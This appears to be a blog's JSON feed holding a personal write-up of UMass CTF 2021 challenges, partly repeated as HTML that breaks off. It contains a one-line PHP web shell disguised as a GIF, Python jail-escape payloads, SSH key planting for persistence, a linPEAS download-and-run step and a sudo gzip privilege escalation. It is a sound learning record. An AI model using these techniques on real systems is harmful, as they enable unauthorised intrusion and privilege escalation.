{
    "version": "https://jsonfeed.org/version/1",
    "title": "Just a blog",
    "home_page_url": "mediocreone.com/",
    "feed_url": "mediocreone.com/feed.json",
    "description": "Piece of my mumbling.",
    "icon": "mediocreone.com/apple-touch-icon.png",
    "favicon": "mediocreone.com/favicon.ico",
    "expired": false,
    
    "author":  {
        "name": "mediocre_one",
        "url": null,
        "avatar": null
    },
    
"items": [
    
        {
            "id": "mediocreone.com/2021/03/29/umass-ctf-2021",
            "title": "UMass CTF 2021 notes",
            "summary": "UMass CTF 2021 notes",
            "content_text": "The UMass CTF 2021 is targeted at undergraduate students. The challenges are supposed to be friendly to an amateur like me. I did manage to solve some of them with a lot of effort and learned few tricks along the way.1. Hermit part 1 [web]The challenge statement:  Help henry find a new shellhttp://104.197.195.221:8086http://34.121.84.161:8086We can see that this website is running on PHP/Apache/Debian. The author suggests a PHP shell upload. Let’s check the image upload.The upload.php saves my uploaded image to the /var/www/html/uploads/NFaTbH path and shows a link to follow it up.The show.php dumps the content of my image and sends back it as a base64 image stream. The filename query param looks suspicious.This trick works, we have the source code of upload.php encoded as a base64 image. Let’s decode it and see the actual code behind it.&lt;?php  $target_dir = \"uploads/\";  $target_file = $target_dir . basename($_FILES[\"fileToUpload\"][\"name\"]);  $filename = tempnam($target_dir, '');  $uploadOk = 1;  $imageFileType = strtolower(pathinfo($target_file,PATHINFO_EXTENSION));  // Check file size  if ($_FILES[\"fileToUpload\"][\"size\"] &gt; 50000) {    echo \"Sorry, your file is too large.\";    $uploadOk = 0;  }  // Allow certain file formats  if($imageFileType != \"jpg\" &amp;&amp; $imageFileType != \"png\" &amp;&amp; $imageFileType != \"jpeg\"  &amp;&amp; $imageFileType != \"gif\" ) {    echo \"Sorry, only JPG, JPEG, PNG &amp; GIF files are allowed.\";    $uploadOk = 0;  }  // Check if $uploadOk is set to 0 by an error  if ($uploadOk == 0) {    echo \"&lt;p&gt;Sorry, your file was not uploaded.&lt;/p&gt;\";    echo \"&lt;a href='/'&gt;Back&lt;/a&gt;\";  // if everything is ok, try to upload file  } else {    if (move_uploaded_file($_FILES[\"fileToUpload\"][\"tmp_name\"], $filename)) {      echo \"&lt;p&gt;The file \". htmlspecialchars( basename( $_FILES[\"fileToUpload\"][\"name\"])) . \" has been uploaded to \" . $filename . \"&lt;/p&gt;\";      $path = \"/show.php?filename=\" . rawurlencode(basename($filename));      echo \"&lt;a href=$path&gt;See Image&lt;/a&gt;\";    } else {      echo \"&lt;p&gt;Sorry, there was an error uploading your file.&lt;/p&gt;\";      echo \"&lt;a href='/'&gt;Back&lt;/a&gt;\";    }  }A big file or non-image upload is restricted. Looks like a PHP shell as an image will likely pass through. Let’s go with a tiny PHP shell.echo '&lt;?php system($_GET[\"c\"]); ?&gt;' &gt; test.php.gifThis error indicates that our shell is working and it just need a command to run. Let’s search the flag with the  grep function.2. Heim [web]The challenge statement:  Modern auth for the modern vikinghttp://104.197.195.221:8081http://34.121.84.161:8081Well from the looks of it I could guess that it is most likely running on python. The challenge is about some sort of authorization tokens.After submitting my name on the page, I received a valid JWT access token and secret key. Let’s access the page with a proper header.I use the ModHeader chrome extension to play with request headers. With the Authorization: Bearer {my_access_token} we got a msg.{  \"api\":{    \"v1\":{      \"/auth\":{        \"get\":{          \"summary\":\"Debugging method for authorization post\",          \"security\":\"None\",          \"parameters\":{            \"access_token\":{              \"required\":true,              \"description\":\"Access token from recently authorized Viking\",              \"in\":\"path\"            },            \"jwt_secret_key\":{              \"required\":false,              \"description\":\"Debugging - should be removed in prod Heim\",              \"in\":\"path\"            }          }        },        \"post\":{          \"summary\":\"Authorize yourself as a Viking\",          \"security\":\"None\",          \"parameters\":{            \"username\":{              \"required\":true,              \"description\":\"Your Viking name\",              \"in\":\"body\",              \"content\":\"multipart/x-www-form-urlencoded\"            }          }        }      },      \"/heim\":{        \"get\":{          \"summary\":\"List the endpoints available to named Vikings\",          \"security\":\"BearerAuth\"        }      },      \"/flag\":{        \"get\":{          \"summary\":\"Retrieve the flag\",          \"security\":\"BearerAuth\"        }      }    }  }}Okay, here we could guess that Odin might only be able to access the /flag endpoint. So we clear the previous request header and go back to the landing page. Supply the name as Odin to get a new access token for Odin. Modify the request header as Authorization: Bearer {odin_access_token} and access /flag endpoint.3. Ekrpat [misc]The challenge statement:  I made so few errors when creating this jail.nc 34.72.64.224 8083nc 35.231.20.75 8083The &gt;&gt;&gt; line beginning looks awfully similar to python interpreter. And the gibberish text is likely to be encoded with substitution ciphers.After a bit of googling, I eventually landed on a correct webpage to translate the gibberish to something readable. https://awsm-tools.comAfter toying with the python3 interpreter and googling a bit. I found a workaround for this simple jail escaping challenge.__builtins__.__dict__['IMPORT'.lower()]('OS'.lower()).__dict__['SYSTEM'.lower()]('ls')__builtins__.__dict__['IMPORT'.lower()]('OS'.lower()).__dict__['SYSTEM'.lower()]('cat flag')4. Scan me [misc]The challenge statement:  The top layer is a lie.scan_me.xcfLookup: The XCF, short for eXperimental Computing Facility, is the native image format of the GIMP image-editing program. I don’t have the GIMP so I have used an online tool to convert XCF to JPG.This is a QR code recovery challenge. I have done my research on the topic. It is possible with some tool and effort, one could try to recover the lost data with certain precisions. I have to admit that this has been the finest artwork of mine in a while.After signed my fine artwork, QR &amp; barcode scanner did the magic and extracted https://imgur.com/a/57VgQ8M. Flag was UMASS{QR-3Z-m0d3}5. Jeopardy [misc]The challenge statement:  This is Jail-pardy!nc 34.72.64.224 8082nc 35.231.20.75 8082 There has been confusion over Miscellaneous 200. The answer is “ios”, it is misleading. My bad. Good luck and enjoy! :)This challenge had 25 quizz questions to unlock letters and characters that you can use in the python3 interpreter to escape the jail. Oh boy, it took me hours to correctly answer 21/25 questions.      Miscellaneous 100 - Name a sponsor of UMassCTF: HackTheBox Correct! You have been awarded the following characters: ‘`’        Miscellaneous 200 - This was the most popular OS that was used in 2020: ios Correct! You have been awarded the following characters: ‘r’        Miscellaneous 300 - The answer to the life, universe, everything? In binary, of course: 101010 Correct! You have been awarded the following characters: ‘h’        Miscellaneous 400 - If there are 6 apples and you take away 4, how many do you have? 4 Correct! You have been awarded the following characters: ‘,’, ‘~’        Miscellaneous 10000 - The UMass Cybersecurity club holds many talks from a wide variety of industry professionals in the tech scene. One such company may have leaked a password to something they were demoing during their presentation but did not care. What was the password displayed on the screen?    This question made me watch several videos and try several passwords. From SQL Injection video, promising wrong passwords: 62d754cc350e84d3b1c32ae79f976f5348e74a40, seb, 6885858486f31043e5839c735d99457f045affd0 , bug. After a decade, this video shows gSH1GgcJHimHy0XaMn. Correct! You have been awarded the following characters: ‘a’, ‘b’, ‘d’, ‘f’, ‘g’, ‘i’, ‘w’, ‘y’, ‘z’        Cybersecurity Tomorrow 100 - This type of computing that has much promise for the future poses a great threat to encryption schemes commonly used today: quantum computing Correct! You have been awarded the following characters: “’”        Cybersecurity Tomorrow 200 - This year will be the next y2k thanks to some data types: 2038 Correct! You have been awarded the following characters: ‘e’        Cybersecurity Tomorrow 300 - Said to be the number 1 risk or threat in cybersecurity for the foreseeable future        Cybersecurity Tomorrow 400 - This architecture of CPUs seems to have many benefits but has repeatedly had vulnerabilities found in it after major releases of them        Cybersecurity Tomorrow 500 - This technology that can be used to create fake events with real images is a serious concern for future cybersecurity: DeepfakesCorrect! You have been awarded the following characters: ‘m’, ‘n’, ‘o’        Cybersecurity Yesterday 100 - Nickname of one of the first “hackers” that is a cereal brand: Captain CrunchCorrect! You have been awarded the following characters: ‘%’        Cybersecurity Yesterday 200 - Movie where tic-tac-toe used to save the world? WarGamesCorrect! You have been awarded the following characters: ‘1’        Cybersecurity Yesterday 300 - Country that US and Israeli has made multiple worms and malware against? IranCorrect! You have been awarded the following characters: ‘c’        Cybersecurity Yesterday 400 - The first real use of cybersecurity against a virus was a program called the ___? The ReaperCorrect! You have been awarded the following characters: ‘.’        Cybersecurity Yesterday 500 - DoD wrote this during the cold war        Cybersecurity Now 100 - According to UMaryland Professor, a hacker attacks computers on average every ___ seconds? 39Correct! You have been awarded the following characters: ‘:’        Cybersecurity Now 200 - University of Michigan researchers controlled a Google Home from 230 feet away with what? laserCorrect! You have been awarded the following characters: ‘)’        Cybersecurity Now 300 - Band that was recently threatened to have unreleased music released unless they pay the hackers money: RadioheadCorrect! You have been awarded the following characters: ‘+’        Cybersecurity Now 400 - This company recently had their source code accessed in a huge breach: MicrosoftCorrect! You have been awarded the following characters: ‘_’, ‘&lt;’        Cybersecurity Now 500 - What is a fairly new way to find electronics that law enforcement are using, i.e. Subway scandal        UMass 100 - What is the name of the mascot of UMass? Sam the MinutemanCorrect! You have been awarded the following characters: ‘(‘        UMass 200 - What is UMass most famously known for being #1 for? foodCorrect! You have been awarded the following characters: ‘{‘        UMass 300 - What dining hall is hard-serve ice cream served at on campus everyday? FranklinCorrect! You have been awarded the following characters: ‘}’        UMass 400 - Where was the old honors college located? Orchard Hill AreaCorrect! You have been awarded the following characters: ‘x’        UMass 500 - This flag was raised from a dorm in the central housing area in the 90s due to unrest from the residents: Jolly RogerCorrect! You have been awarded the following characters: ‘s’, ‘t’, ‘u’, ‘v’  So far, I have access to (){},~:+_&lt;%.1 and abcdefghi[j][k][l]mno[p]rstuvwxyz. Not all the questions are answered, but I have to settle with what I have got.The approach I have used is similar to what worked for the ekrpat challenge.exec('''__builtins__.__dict__['__import__']('os').__dict__['system']('ls')''')These are my workarounds for the characters/letters which I am not allowed to type in:chr(ord('i')+1) # jchr(ord('i')+1+1) # kchr(ord('i')+1+1+1) # lchr(ord('o')+1) # pchr(ord(':')+11+11+11) # [chr(ord('&lt;')+11+11+11) # ]chr(ord('%')+1+1) # ' - strangely '''text''' failing to escape ' sometimes.I have replaced all the non-allowed letters/characters with my workarounds to constructed the code.exec(chr(ord('o')+1) + 'rint(__bui' + chr(ord('i')+1+1+1)+ 'tins__.__dict__' + chr(ord(':')+11+11+11) + ''''__im''' + chr(ord('o')+1) + 'ort__' + chr(ord('%')+1+1) + chr(ord('&lt;')+11+11+11) + '''('os').__dict__''' + chr(ord(':')+11+11+11) + ''''system''' + chr(ord('%')+1+1) + chr(ord('&lt;')+11+11+11) + '(' + chr(ord('%')+1+1) + chr(ord('i')+1+1+1) + 's' + chr(ord('%')+1+1) + '))')And a minor adjustment to issue the cat flag.txt command.exec(chr(ord('o')+1) + 'rint(__bui' + chr(ord('i')+1+1+1)+ 'tins__.__dict__' + chr(ord(':')+11+11+11) + ''''__im''' + chr(ord('o')+1) + 'ort__' + chr(ord('%')+1+1) + chr(ord('&lt;')+11+11+11) + '''('os').__dict__''' + chr(ord(':')+11+11+11) + ''''system''' + chr(ord('%')+1+1) + chr(ord('&lt;')+11+11+11) + '(' + chr(ord('%')+1+1) + 'cat f' + chr(ord('i')+1+1+1) + 'ag.txt' + chr(ord('%')+1+1) + '))')Yeah, thank you, Alex. I really enjoyed the challenge despite the few hours of struggle.6. Notes [forensics]The challenge statement:  The breach seems to have originated from this host. Can you find the user’s mistake? Here is a memory image of their workstation from that day.File: image.mem (PS: too big to reference)We have a memory dump to analyze to capture the flag. I came accross this sort of challenge before and remembered the volatility.To read the image information.vol.py imageinfo -f ./image.memNFO    : volatility.debug    : Determining profile based on KDBG search...          Suggested Profile(s) : Win7SP1x64, Win7SP0x64, Win2008R2SP0x64, Win2008R2SP1x64_24000, Win2008R2SP1x64_23418, Win2008R2SP1x64, Win7SP1x64_24000, Win7SP1x64_23418...To see the process list.vol.py pslist --profile=Win7SP1x64 -f ./image.memOffset(V)          Name                    PID   PPID   Thds     Hnds   Sess  Wow64 Start                          Exit                          ------------------ -------------------- ------ ------ ------ -------- ------ ------ ------------------------------ ------------------------------0xfffffa8000ca0040 System                    4      0    173      526 ------      0 2021-03-20 18:57:47 UTC+0000                                 ...                               0xfffffa8000dd0060 notepad.exe            2696   2288      4      309      1      0 2021-03-20 17:59:34 UTC+0000                                 ...0xfffffa800213e4e0 SearchFilterHo         1740   1888      5      103      0      0 2021-03-20 18:15:53 UTC+0000 To dump the notepad.exe memory to file.volatility -f ./image.mem --profile=Win7SP1x64 memdump --dump-dir=./ -p 2696To find the flag using strings and grep functions.strings -e l ./2696.dmp| grep \"UMASS\"UMASS{$3CUR3_$70Rag3}7. Webserver [forensics]The challenge statement:  Our webserver has a few flaws in it :(http://34.72.232.191:8080Link to a file: a.outI don’t think my solution is what the author had in mind. After all, he should have given us the a.out file for a reason. As soon as I saw the /echo?message endpoint I wanted to try a command execution. The dumb luck was on my side, it was a challenge that took the least effort from me.8. Hermit - Part 2 [web]The challenge statement:  Who are you? How did you get here? You better zip on out of here or else.104.197.195.221:808734.121.84.161:8087(The server is likely not broken. If you really think it’s broken, create a support ticket.)Hint 1: Try enumerationHint 2: The port you are looking for has been forwarded to 8087.My first impression was that this challenge may be out of my league. Initially, I thought there suppose to be a website running behind this ssh interface. So I googled a lot of random stuff like ssh tunnel, ssh proxy and ssh firewall etc … Well, that was a fruitless few hours. People were solving it with a much better success rate. I read over the challenge statement again after a break. And that’s when the Hermit - Part2, Part2 caught my eyes. I began to look at the challenge in a proper way.  Task 1: Get access to the server using ssh  Task 2: Find the flag or access the local webserver running within server.And most importantly, I realized that somehow I could use the hermit part1 vulnerability to solve the hermit part2 challenge. Time to visit back to the hermit one.To see the debain user namewhoamiTo check the hermit’s default ssh folder hoping to find a usable key pair. (I tried that weird looking id_ed25519 key but it was password protected.)cat /home/hermit/.sshTo generate a new ssh key pair with no passphrase for myself.ssh-keygen -b 2048 -t rsa -f /tmp/mediocre -q -N \"\"To get my private key contentcat /tmp/mediocreHere, I manually copied my private key content nicely into hermit.key file on my local machine and set the proper permission.To add my public key to the authorized_keys file.cat /tmp/mediocre.pub &gt;&gt; /home/hermit/.ssh/authorized_keysAnd tried to access the server via ssh through the 8087 port with my keys.From here on, I have tried a bunch of useless commands. Failed to find the other webserver which I imagined to be running there somewhere. In the end, I presumed that this is some sort of Linux privilege escalation challenge. While chatting with a friend, I learn about the linPEAS script and decided to give it a go.mkdir /tmp/mediocre_onecd /tmp/mediocre_onecurl https://raw.githubusercontent.com/carlospolop/privilege-escalation-awesome-scripts-suite/master/linPEAS/linpeas.sh &gt; line.shchmod +x line.sh./line.sh &gt; outThe output of the linPEAS script had a lot of information so I took a shortcut.cat out | grep flag    (root) NOPASSWD: /bin/gzip -f /root/rootflag.txt -thermit ALL = (root) NOPASSWD: /bin/gzip -f /root/rootflag.txt -t/home/hermit/flag/home/hermit/flag/userflag.txtdrwxrwxr-t 1 root   root   4096 Mar 27 04:52 flag/tmp/mediocre_one/out:hermit ALL = (root) NOPASSWD: /bin/gzip -f /root/rootflag.txt -t/tmp/mediocre_one/out:    (root) NOPASSWD: /bin/gzip -f /root/rootflag.txt -tsudo /bin/gzip -f /root/rootflag.txt -tUMASS{a_test_of_integrity}rm -rf /tmp/mediocre_one # clean upMy successful submissions end here. I spent quite a few hours trying the other challenges:  [suckless2] Failed to escape from the jail script written in Myrddin language.  [replme] Failed to figure out the Janet language repl challenge.  [malware] Failed to decrypt these encrypted files with a python script.  [easy as 123] Failed to extract the flag from easy.pcap [30MB] with Wireshark. My suspect was 19 or 36. (forgot)  [chicken] Failed to extract anything useful from the chicken.pdf. (fun source)Anyway, I enjoyed the UMass CTF 2021 event. Thanks to those who organized and sponsored the event.",
            "content_html": "<p>The UMass CTF 2021 is targeted at undergraduate students. The challenges are supposed to be friendly to an amateur like me. I did manage to solve some of them with a lot of effort and learned few tricks along the way.</p><h3 id=\"1-hermit-part-1-web\">1. <a id=\"hermit\" style=\"text-decoration:none;\">Hermit part 1 [web]</a></h3><p>The challenge statement:</p><blockquote>  <p>Help henry find a new shell<br />http://104.197.195.221:8086<br />http://34.121.84.161:8086</p></blockquote><p><img src=\"/assets/img/umass/hermit/landing.png\" alt=\"Landing page\" /></p><p>We can see that this website is running on PHP/Apache/Debian. The author suggests a PHP shell upload. Let’s check the image upload.</p><p><img src=\"/assets/img/umass/hermit/upload.png\" alt=\"Upload page\" /></p><p>The <code class=\"language-plaintext highlighter-rouge\">upload.php</code> saves my uploaded image to the <code class=\"language-plaintext highlighter-rouge\">/var/www/html/uploads/NFaTbH</code> path and shows a link to follow it up.</p><p><img src=\"/assets/img/umass/hermit/show.png\" alt=\"Show page\" /></p><p>The <code class=\"language-plaintext highlighter-rouge\">show.php</code> dumps the content of my image and sends back it as a base64 image stream. The <code class=\"language-plaintext highlighter-rouge\">filename</code> query param looks suspicious.</p><p><img src=\"/assets/img/umass/hermit/filename.png\" alt=\"Filename param\" /></p><p>This trick works, we have the source code of <code class=\"language-plaintext highlighter-rouge\">upload.php</code> encoded as a base64 image. Let’s decode it and see the actual code behind it.</p><p><img src=\"/assets/img/umass/hermit/decode.png\" alt=\"Base64 decode\" /></p><div class=\"language-php highlighter-rouge\"><div class=\"highlight\"><pre class=\"highlight\"><code><span class=\"cp\">&lt;?php</span>  <span class=\"nv\">$target_dir</span> <span class=\"o\">=</span> <span class=\"s2\">\"uploads/\"</span><span class=\"p\">;</span>  <span class=\"nv\">$target_file</span> <span class=\"o\">=</span> <span class=\"nv\">$target_dir</span> <span class=\"mf\">.</span> <span class=\"nb\">basename</span><span class=\"p\">(</span><span class=\"nv\">$_FILES</span><span class=\"p\">[</span><span class=\"s2\">\"fileToUpload\"</span><span class=\"p\">][</span><span class=\"s2\">\"name\"</span><span class=\"p\">]);</span>  <span class=\"nv\">$filename</span> <span class=\"o\">=</span> <span class=\"nb\">tempnam</span><span class=\"p\">(</span><span class=\"nv\">$target_dir</span><span class=\"p\">,</span> <span class=\"s1\">''</span><span class=\"p\">);</span>  <span class=\"nv\">$uploadOk</span> <span class=\"o\">=</span> <span class=\"mi\">1</span><span class=\"p\">;</span>  <span class=\"nv\">$imageFileType</span> <span class=\"o\">=</span> <span class=\"nb\">strtolower</span><span class=\"p\">(</span><span class=\"nb\">pathinfo</span><span class=\"p\">(</span><span class=\"nv\">$target_file</span><span class=\"p\">,</span><span class=\"no\">PATHINFO_EXTENSION</span><span class=\"p\">));</span>  <span class=\"c1\">// Check file size</span>  <span class=\"k\">if</span> <span class=\"p\">(</span><span class=\"nv\">$_FILES</span><span class=\"p\">[</span><span class=\"s2\">\"fileToUpload\"</span><span class=\"p\">][</span><span class=\"s2\">\"size\"</span><span class=\"p\">]</span> <span class=\"o\">&gt;</span> <span class=\"mi\">50000</span><span class=\"p\">)</span> <span class=\"p\">{</span>    <span class=\"k\">echo</span> <span class=\"s2\">\"Sorry, your file is too large.\"</span><span class=\"p\">;</span>    <span class=\"nv\">$uploadOk</span> <span class=\"o\">=</span> <span class=\"mi\">0</span><span class=\"p\">;</span>  <span class=\"p\">}</span>  <span class=\"c1\">// Allow certain file formats</span>  <span class=\"k\">if</span><span class=\"p\">(</span><span class=\"nv\">$imageFileType</span> <span class=\"o\">!=</span> <span class=\"s2\">\"jpg\"</span> <span class=\"o\">&amp;&amp;</span> <span class=\"nv\">$imageFileType</span> <span class=\"o\">!=</span> <span class=\"s2\">\"png\"</span> <span class=\"o\">&amp;&amp;</span> <span class=\"nv\">$imageFileType</span> <span class=\"o\">!=</span> <span class=\"s2\">\"jpeg\"</span>  <span class=\"o\">&amp;&amp;</span> <span class=\"nv\">$imageFileType</span> <span class=\"o\">!=</span> <span class=\"s2\">\"gif\"</span> <span class=\"p\">)</span> <span class=\"p\">{</span>    <span class=\"k\">echo</span> <span class=\"s2\">\"Sorry, only JPG, JPEG, PNG &amp; GIF files are allowed.\"</span><span class=\"p\">;</span>    <span class=\"nv\">$uploadOk</span> <span class=\"o\">=</span> <span class=\"mi\">0</span><span class=\"p\">;</span>  <span class=\"p\">}</span>  <span class=\"c1\">// Check if $uploadOk is set to 0 by an error</span>  <span class=\"k\">if</span> <span class=\"p\">(</span><span class=\"nv\">$uploadOk</span> <span class=\"o\">==</span> <span class=\"mi\">0</span><span class=\"p\">)</span> <span class=\"p\">{</span>    <span class=\"k\">echo</span> <span class=\"s2\">\"&lt;p&gt;Sorry, your file was not uploaded.&lt;/p&gt;\"</span><span class=\"p\">;</span>    <span class=\"k\">echo</span> <span class=\"s2\">\"&lt;a href='/'&gt;Back&lt;/a&gt;\"</span><span class=\"p\">;</span>  <span class=\"c1\">// if everything is ok, try to upload file</span>  <span class=\"p\">}</span> <span class=\"k\">else</span> <span class=\"p\">{</span>    <span class=\"k\">if</span> <span class=\"p\">(</span><span class=\"nb\">move_uploaded_file</span><span class=\"p\">(</span><span class=\"nv\">$_FILES</span><span class=\"p\">[</span><span class=\"s2\">\"fileToUpload\"</span><span class=\"p\">][</span><span class=\"s2\">\"tmp_name\"</span><span class=\"p\">],</span> <span class=\"nv\">$filename</span><span class=\"p\">))</span> <span class=\"p\">{</span>      <span class=\"k\">echo</span> <span class=\"s2\">\"&lt;p&gt;The file \"</span><span class=\"mf\">.</span> <span class=\"nb\">htmlspecialchars</span><span class=\"p\">(</span> <span class=\"nb\">basename</span><span class=\"p\">(</span> <span class=\"nv\">$_FILES</span><span class=\"p\">[</span><span class=\"s2\">\"fileToUpload\"</span><span class=\"p\">][</span><span class=\"s2\">\"name\"</span><span class=\"p\">]))</span> <span class=\"mf\">.</span> <span class=\"s2\">\" has been uploaded to \"</span> <span class=\"mf\">.</span> <span class=\"nv\">$filename</span> <span class=\"mf\">.</span> <span class=\"s2\">\"&lt;/p&gt;\"</span><span class=\"p\">;</span>      <span class=\"nv\">$path</span> <span class=\"o\">=</span> <span class=\"s2\">\"/show.php?filename=\"</span> <span class=\"mf\">.</span> <span class=\"nb\">rawurlencode</span><span class=\"p\">(</span><span class=\"nb\">basename</span><span class=\"p\">(</span><span class=\"nv\">$filename</span><span class=\"p\">));</span>      <span class=\"k\">echo</span> <span class=\"s2\">\"&lt;a href=</span><span class=\"nv\">$path</span><span class=\"s2\">&gt;See Image&lt;/a&gt;\"</span><span class=\"p\">;</span>    <span class=\"p\">}</span> <span class=\"k\">else</span> <span class=\"p\">{</span>      <span class=\"k\">echo</span> <span class=\"s2\">\"&lt;p&gt;Sorry, there was an error uploading your file.&lt;/p&gt;\"</span><span class=\"p\">;</span>      <span class=\"k\">echo</span> <span class=\"s2\">\"&lt;a href='/'&gt;Back&lt;/a&gt;\"</span><span class=\"p\">;</span>    <span class=\"p\">}</span>  <span class=\"p\">}</span></code></pre></div></div><p>A big file or non-image upload is restricted. Looks like a PHP shell as an image will likely pass through. Let’s go with a tiny PHP shell.</p><div class=\"language-bash highlighter-rouge\"><div class=\"highlight\"><pre class=\"highlight\"><code><span class=\"nb\">echo</span> <span class=\"s1\">'&lt;?php system($_GET[\"c\"]); ?&gt;'</span> <span class=\"o\">&gt;</span> test.php.gif</code></pre></div></div><p><img src=\"/assets/img/umass/hermit/error.png\" alt=\"Missing param error\" />This error indicates that our shell is working and it just need a command to run. Let’s search the flag with the  <code class=\"language-plaintext highlighter-rouge\">grep</code> function.</p><p><img src=\"/assets/img/umass/hermit/flag.png\" alt=\"Flag\" /></p><hr /><h3 id=\"2-heim-web\">2. <a id=\"heim\" style=\"text-decoration:none;\">Heim [web]</a></h3><p>The challenge statement:</p><blockquote>  <p>Modern auth for the modern viking<br />http://104.197.195.221:8081<br />http://34.121.84.161:8081</p></blockquote><p><img src=\"/assets/img/umass/heim/landing.png\" alt=\"Landing page\" /></p><p>Well from the looks of it I could guess that it is most likely running on python. The challenge is about some sort of authorization tokens.</p><p><img src=\"/assets/img/umass/heim/authorized.png\" alt=\"Authorized page\" /></p><p><img src=\"/assets/img/umass/heim/jwt.png\" alt=\"JWT check\" /></p><p>After submitting my name on the page, I received a valid JWT access token and secret key. Let’s access the page with a proper header.</p><p><img src=\"/assets/img/umass/heim/headers.png\" alt=\"Authorization header\" /></p><p>I use the <a href=\"https://chrome.google.com/webstore/detail/modheader/idgpnmonknjnojddfkpgkljpfnnfcklj?hl=en\">ModHeader</a> chrome extension to play with request headers. With the <code class=\"language-plaintext highlighter-rouge\">Authorization: Bearer {my_access_token}</code> we got a msg.</p><p><img src=\"/assets/img/umass/heim/decode.png\" alt=\"Base64 decode\" /></p><div class=\"language-json highlighter-rouge\"><div class=\"highlight\"><pre class=\"highlight\"><code><span class=\"p\">{</span><span class=\"w\">  </span><span class=\"nl\">\"api\"</span><span class=\"p\">:{</span><span class=\"w\">    </span><span class=\"nl\">\"v1\"</span><span class=\"p\">:{</span><span class=\"w\">      </span><span class=\"nl\">\"/auth\"</span><span class=\"p\">:{</span><span class=\"w\">        </span><span class=\"nl\">\"get\"</span><span class=\"p\">:{</span><span class=\"w\">          </span><span class=\"nl\">\"summary\"</span><span class=\"p\">:</span><span class=\"s2\">\"Debugging method for authorization post\"</span><span class=\"p\">,</span><span class=\"w\">          </span><span class=\"nl\">\"security\"</span><span class=\"p\">:</span><span class=\"s2\">\"None\"</span><span class=\"p\">,</span><span class=\"w\">          </span><span class=\"nl\">\"parameters\"</span><span class=\"p\">:{</span><span class=\"w\">            </span><span class=\"nl\">\"access_token\"</span><span class=\"p\">:{</span><span class=\"w\">              </span><span class=\"nl\">\"required\"</span><span class=\"p\">:</span><span class=\"kc\">true</span><span class=\"p\">,</span><span class=\"w\">              </span><span class=\"nl\">\"description\"</span><span class=\"p\">:</span><span class=\"s2\">\"Access token from recently authorized Viking\"</span><span class=\"p\">,</span><span class=\"w\">              </span><span class=\"nl\">\"in\"</span><span class=\"p\">:</span><span class=\"s2\">\"path\"</span><span class=\"w\">            </span><span class=\"p\">},</span><span class=\"w\">            </span><span class=\"nl\">\"jwt_secret_key\"</span><span class=\"p\">:{</span><span class=\"w\">              </span><span class=\"nl\">\"required\"</span><span class=\"p\">:</span><span class=\"kc\">false</span><span class=\"p\">,</span><span class=\"w\">              </span><span class=\"nl\">\"description\"</span><span class=\"p\">:</span><span class=\"s2\">\"Debugging - should be removed in prod Heim\"</span><span class=\"p\">,</span><span class=\"w\">              </span><span class=\"nl\">\"in\"</span><span class=\"p\">:</span><span class=\"s2\">\"path\"</span><span class=\"w\">            </span><span class=\"p\">}</span><span class=\"w\">          </span><span class=\"p\">}</span><span class=\"w\">        </span><span class=\"p\">},</span><span class=\"w\">        </span><span class=\"nl\">\"post\"</span><span class=\"p\">:{</span><span class=\"w\">          </span><span class=\"nl\">\"summary\"</span><span class=\"p\">:</span><span class=\"s2\">\"Authorize yourself as a Viking\"</span><span class=\"p\">,</span><span class=\"w\">          </span><span class=\"nl\">\"security\"</span><span class=\"p\">:</span><span class=\"s2\">\"None\"</span><span class=\"p\">,</span><span class=\"w\">          </span><span class=\"nl\">\"parameters\"</span><span class=\"p\">:{</span><span class=\"w\">            </span><span class=\"nl\">\"username\"</span><span class=\"p\">:{</span><span class=\"w\">              </span><span class=\"nl\">\"required\"</span><span class=\"p\">:</span><span class=\"kc\">true</span><span class=\"p\">,</span><span class=\"w\">              </span><span class=\"nl\">\"description\"</span><span class=\"p\">:</span><span class=\"s2\">\"Your Viking name\"</span><span class=\"p\">,</span><span class=\"w\">              </span><span class=\"nl\">\"in\"</span><span class=\"p\">:</span><span class=\"s2\">\"body\"</span><span class=\"p\">,</span><span class=\"w\">              </span><span class=\"nl\">\"content\"</span><span class=\"p\">:</span><span class=\"s2\">\"multipart/x-www-form-urlencoded\"</span><span class=\"w\">            </span><span class=\"p\">}</span><span class=\"w\">          </span><span class=\"p\">}</span><span class=\"w\">        </span><span class=\"p\">}</span><span class=\"w\">      </span><span class=\"p\">},</span><span class=\"w\">      </span><span class=\"nl\">\"/heim\"</span><span class=\"p\">:{</span><span class=\"w\">        </span><span class=\"nl\">\"get\"</span><span class=\"p\">:{</span><span class=\"w\">          </span><span class=\"nl\">\"summary\"</span><span class=\"p\">:</span><span class=\"s2\">\"List the endpoints available to named Vikings\"</span><span class=\"p\">,</span><span class=\"w\">          </span><span class=\"nl\">\"security\"</span><span class=\"p\">:</span><span class=\"s2\">\"BearerAuth\"</span><span class=\"w\">        </span><span class=\"p\">}</span><span class=\"w\">      </span><span class=\"p\">},</span><span class=\"w\">      </span><span class=\"nl\">\"/flag\"</span><span class=\"p\">:{</span><span class=\"w\">        </span><span class=\"nl\">\"get\"</span><span class=\"p\">:{</span><span class=\"w\">          </span><span class=\"nl\">\"summary\"</span><span class=\"p\">:</span><span class=\"s2\">\"Retrieve the flag\"</span><span class=\"p\">,</span><span class=\"w\">          </span><span class=\"nl\">\"security\"</span><span class=\"p\">:</span><span class=\"s2\">\"BearerAuth\"</span><span class=\"w\">        </span><span class=\"p\">}</span><span class=\"w\">      </span><span class=\"p\">}</span><span class=\"w\">    </span><span class=\"p\">}</span><span class=\"w\">  </span><span class=\"p\">}</span><span class=\"w\"></span><span class=\"p\">}</span><span class=\"w\"></span></code></pre></div></div><p><img src=\"/assets/img/umass/heim/attempt.png\" alt=\"Flag attempt\" /></p><p>Okay, here we could guess that <code class=\"language-plaintext highlighter-rouge\">Odin</code> might only be able to access the <code class=\"language-plaintext highlighter-rouge\">/flag</code> endpoint. So we clear the previous request header and go back to the landing page. Supply the name as <code class=\"language-plaintext highlighter-rouge\">Odin</code> to get a new access token for <code class=\"language-plaintext highlighter-rouge\">Odin</code>. Modify the request header as <code class=\"language-plaintext highlighter-rouge\">Authorization: Bearer {odin_access_token}</code> and access <code class=\"language-plaintext highlighter-rouge\">/flag</code> endpoint.</p><p><img src=\"/assets/img/umass/heim/flag.png\" alt=\"Flag\" /></p><hr /><h3 id=\"3-ekrpat-misc\">3. <a id=\"ekrpat\" style=\"text-decoration:none;\">Ekrpat [misc]</a></h3><p>The challenge statement:</p><blockquote>  <p>I made so few errors when creating this jail.<br />nc 34.72.64.224 8083<br />nc 35.231.20.75 8083</p></blockquote><p><img src=\"/assets/img/umass/ekrpat/ekrpat.png\" alt=\"Ekrpat\" /></p><p>The <code class=\"language-plaintext 